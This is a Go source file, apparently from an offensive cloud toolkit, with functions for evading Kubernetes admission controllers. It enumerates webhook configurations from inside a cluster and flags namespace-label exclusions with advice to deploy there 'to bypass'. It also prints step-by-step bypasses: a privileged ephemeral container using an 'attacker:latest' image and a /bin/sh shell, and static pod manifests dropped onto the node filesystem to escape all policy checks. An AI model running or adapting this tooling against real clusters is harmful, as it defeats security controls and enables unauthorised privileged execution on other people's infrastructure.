package cloudevasion

import (
	"context"
	"fmt"
	"strings"

	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
	"k8s.io/client-go/kubernetes"
	"k8s.io/client-go/rest"
)

type AdmissionController struct {
	Name     string
	Type     string
	Webhooks []string
}

func EvadeAdmissionControllers(ctx context.Context, technique string) (*EvasionResult, error) {
	switch technique {
	case "enumerate":
		return enumerateWebhooks(ctx)
	case "bypass_labels":
		return bypassViaLabels(ctx)
	case "ephemeral":
		return ephemeralContainerBypass(ctx)
	case "static_pod":
		return staticPodBypass(ctx)
	default:
		return enumerateWebhooks(ctx)
	}
}

func enumerateWebhooks(ctx context.Context) (*EvasionResult, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return &EvasionResult{Technique: "enumerate", Success: false, Output: err.Error()}, nil
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return &EvasionResult{Technique: "enumerate", Success: false, Output: err.Error()}, nil
	}

	var sb strings.Builder
	sb.WriteString("Admission Controller Enumeration:\n\n")

	mutating, err := client.AdmissionregistrationV1().MutatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
	if err == nil {
		sb.WriteString("  Mutating Webhooks:\n")
		for _, mwc := range mutating.Items {
			fmt.Fprintf(&sb, "    %s\n", mwc.Name)
			for _, wh := range mwc.Webhooks {
				fmt.Fprintf(&sb, "      - %s (failurePolicy=%s)\n", wh.Name, *wh.FailurePolicy)
				if wh.NamespaceSelector != nil {
					for _, expr := range wh.NamespaceSelector.MatchExpressions {
						fmt.Fprintf(&sb, "        nsSelector: %s %s %v\n", expr.Key, expr.Operator, expr.Values)
					}
				}
				for _, rule := range wh.Rules {
					fmt.Fprintf(&sb, "        resources: %v operations: %v\n", rule.Resources, rule.Operations)
				}
			}
		}
	}

	validating, err := client.AdmissionregistrationV1().ValidatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
	if err == nil {
		sb.WriteString("\n  Validating Webhooks:\n")
		for _, vwc := range validating.Items {
			fmt.Fprintf(&sb, "    %s\n", vwc.Name)
			for _, wh := range vwc.Webhooks {
				fmt.Fprintf(&sb, "      - %s (failurePolicy=%s)\n", wh.Name, *wh.FailurePolicy)
				if wh.NamespaceSelector != nil {
					for _, expr := range wh.NamespaceSelector.MatchExpressions {
						fmt.Fprintf(&sb, "        nsSelector: %s %s %v\n", expr.Key, expr.Operator, expr.Values)
					}
				}
			}
		}
	}

	return &EvasionResult{
		Technique: "enumerate",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func bypassViaLabels(ctx context.Context) (*EvasionResult, error) {
	config, err := rest.InClusterConfig()
	if err != nil {
		return &EvasionResult{Technique: "bypass_labels", Success: false, Output: err.Error()}, nil
	}

	client, err := kubernetes.NewForConfig(config)
	if err != nil {
		return &EvasionResult{Technique: "bypass_labels", Success: false, Output: err.Error()}, nil
	}

	var sb strings.Builder
	sb.WriteString("Admission Controller Label Bypass:\n\n")

	mutating, err := client.AdmissionregistrationV1().MutatingWebhookConfigurations().List(ctx, metav1.ListOptions{})
	if err == nil {
		for _, mwc := range mutating.Items {
			for _, wh := range mwc.Webhooks {
				if wh.NamespaceSelector != nil {
					for _, expr := range wh.NamespaceSelector.MatchExpressions {
						if expr.Operator == "NotIn" || expr.Operator == "DoesNotExist" {
							fmt.Fprintf(&sb, "  Webhook '%s' excludes namespaces where:\n", wh.Name)
							fmt.Fprintf(&sb, "    %s %s %v\n", expr.Key, expr.Operator, expr.Values)
							sb.WriteString("    → Deploy pods in namespace with this label to bypass!\n\n")
						}
					}
					for key, val := range wh.NamespaceSelector.MatchLabels {
						fmt.Fprintf(&sb, "  Webhook '%s' only applies to ns with label: %s=%s\n", wh.Name, key, val)
						sb.WriteString("    → Deploy in namespace WITHOUT this label to bypass!\n\n")
					}
				}
			}
		}
	}

	sb.WriteString("  Common exclusion patterns:\n")
	sb.WriteString("    - kube-system (often excluded from all webhooks)\n")
	sb.WriteString("    - control-plane label exclusion\n")
	sb.WriteString("    - pod-security.kubernetes.io/exempt=true\n")

	return &EvasionResult{
		Technique: "bypass_labels",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func ephemeralContainerBypass(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Ephemeral Container Bypass:\n\n")
	sb.WriteString("  Many admission controllers don't validate ephemeral container specs.\n")
	sb.WriteString("  Ephemeral containers bypass:\n")
	sb.WriteString("    - Pod security policies/standards\n")
	sb.WriteString("    - Image allowlists\n")
	sb.WriteString("    - Resource quota enforcement\n")
	sb.WriteString("    - Security context constraints\n\n")
	sb.WriteString("  Attack: Add ephemeral container to existing pod with:\n")
	sb.WriteString("    - privileged: true\n")
	sb.WriteString("    - hostPID: true (inherited from pod)\n")
	sb.WriteString("    - arbitrary image\n\n")
	sb.WriteString("  kubectl debug <pod> --image=attacker:latest --target=<container> -- /bin/sh\n")
	sb.WriteString("  API equivalent: PATCH /api/v1/namespaces/<ns>/pods/<pod>/ephemeralcontainers\n")

	return &EvasionResult{
		Technique: "ephemeral",
		Success:   true,
		Output:    sb.String(),
	}, nil
}

func staticPodBypass(_ context.Context) (*EvasionResult, error) {
	var sb strings.Builder
	sb.WriteString("Static Pod Bypass:\n\n")
	sb.WriteString("  Static pods are managed directly by kubelet, bypassing ALL admission controllers.\n\n")
	sb.WriteString("  Requirements:\n")
	sb.WriteString("    - Write access to node filesystem (via hostPath or container escape)\n")
	sb.WriteString("    - Knowledge of static pod manifest path\n\n")
	sb.WriteString("  Common static pod paths:\n")
	sb.WriteString("    - /etc/kubernetes/manifests/\n")
	sb.WriteString("    - /etc/kubelet.d/\n")
	sb.WriteString("    - Custom path from --pod-manifest-path kubelet flag\n\n")
	sb.WriteString("  Drop a pod manifest in the static pod directory:\n")
	sb.WriteString("    - No admission webhook validation\n")
	sb.WriteString("    - No OPA/Gatekeeper policy enforcement\n")
	sb.WriteString("    - No Kyverno policy check\n")
	sb.WriteString("    - Pod runs with any security context specified\n")

	return &EvasionResult{
		Technique: "static_pod",
		Success:   true,
		Output:    sb.String(),
	}, nil
}
